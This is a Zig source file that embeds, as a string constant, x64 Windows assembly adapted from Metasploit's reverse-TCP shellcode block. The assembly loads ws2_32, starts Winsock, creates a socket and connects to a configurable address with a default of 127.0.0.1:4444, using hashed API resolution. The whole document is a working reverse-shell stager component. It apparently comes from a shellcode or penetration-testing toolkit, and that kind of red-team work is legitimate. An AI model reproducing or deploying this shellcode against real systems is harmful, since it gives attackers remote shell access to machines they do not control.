// Reference:
// https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_reverse_tcp.asm
pub const asm_code =
    \\reverse_tcp:
    \\  ; Setup the structures we need on the stack...
    \\  mov r14, 'ws2_32'
    \\  push r14                ; Push the bytes 'ws2_32', 0, 0 onto the stack.
    \\  mov r14, rsp            ; Save pointer to the 'ws2_32' string for LoadLibraryA call.
    \\  sub rsp, 408+8          ; Alloc sizeof(struct WSAData) bytes for the WSAData structure (+8 for alignment).
    \\  mov r13, rsp            ; Save pointer to the WSAData structure for WSAStartup call.
    \\  mov r12, {LOCAL_ADDR}   ; Default: 0x0100007F5C110002
    \\  push r12                ; `hex(127.0.0.1(7f.00.00.01)) = 7f000001` + `hex(4444) = 0x115C` + `AF_INET = 0x0002`
    \\  mov r12, rsp            ; Save pointer to sockaddr struct for connect call
    \\
    \\  ; Perform the call to LoadLibraryA...
    \\  mov rcx, r14            ; Set the param for the library to load.
    \\  mov r10d, 0x0726774C    ; hash("kernel32.dll", "LoadLibraryA")
    \\  call rbp                ; Call LoadLibraryA("ws2_32")
    \\
    \\  ; Perform the call to WSAStartup...
    \\  mov rdx, r13            ; Second param is a pointer to this struct.
    \\  push 0x0101
    \\  pop rcx                 ; Set the param for the version requested
    \\  mov r10d, 0x006B8029    ; hash("ws2_32.dll", "WSAStartup")
    \\  call rbp                ; Call WSAStartup(0x0101, &WSAData)
    \\
    \\  ; Perform the call to WSASocketA...
    \\  push rax                ; if we succeed, rax will be zero, push zero for the flags param.
    \\  push rax                ; Push null for reserved parameter.
    \\  xor r9, r9              ; Wd don't specify a WSAPROTOCOL_INFO structure
    \\  xor r8, r8              ; We don't specify a protocol
    \\  inc rax
    \\  mov rdx, rax            ; Push SOCK_STREAM
    \\  inc rax
    \\  mov rcx, rax            ; Push AF_INET
    \\  mov r10d, 0xE0DF0FEA    ; hash("ws2_32.dll", "WSASocketA")
    \\  call rbp                ; Call WSASocketA(AF_INET, SOCK_STREAM, 0, 0, 0, 0)
    \\  mov rdi, rax            ; Save the socket for later
    \\
    \\  ; Perform the call to connect...
    \\  push byte 16            ; Length of the sockaddr struct
    \\  pop r8                  ; Pop off the third param
    \\  mov rdx, r12            ; Set second param to pointer to sockaddr struct
    \\  mov rcx, rdi            ; The socket
    \\  mov r10d, 0x6174A599    ; hash("ws2_32.dll", "connect")
    \\  call rbp                ; connect(s, &sockaddr, 16)
    \\
    \\  ; Restore RSP so we don't have any alignment issues with the next block...
    \\  add rsp, ((408+8) + (8*4) + (32*4)) ; Cleanup the stack allocations
;
